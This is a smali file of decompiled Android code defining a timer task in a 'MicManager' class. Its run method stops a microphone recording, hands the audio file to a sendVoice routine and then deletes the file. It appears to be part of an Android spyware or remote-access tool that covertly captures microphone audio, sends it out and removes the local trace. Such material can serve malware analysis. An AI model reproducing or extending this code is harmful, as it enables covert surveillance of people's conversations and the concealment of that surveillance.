.class final Ljohn/mine/king/john/MicManager$1;
.super Ljava/util/TimerTask;
.source "MicManager.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Ljohn/mine/king/john/MicManager;->startRecording(I)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x8
    name = null
.end annotation


# direct methods
.method constructor <init>()V
    .locals 0

    .prologue
    .line 64
    invoke-direct {p0}, Ljava/util/TimerTask;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 1

    .prologue
    .line 68
    sget-object v0, Ljohn/mine/king/john/MicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->stop()V

    .line 69
    sget-object v0, Ljohn/mine/king/john/MicManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    .line 70
    sget-object v0, Ljohn/mine/king/john/MicManager;->audiofile:Ljava/io/File;

    # invokes: Ljohn/mine/king/john/MicManager;->sendVoice(Ljava/io/File;)V
    invoke-static {v0}, Ljohn/mine/king/john/MicManager;->access$000(Ljava/io/File;)V

    .line 71
    sget-object v0, Ljohn/mine/king/john/MicManager;->audiofile:Ljava/io/File;

    invoke-virtual {v0}, Ljava/io/File;->delete()Z

    .line 72
    return-void
.end method
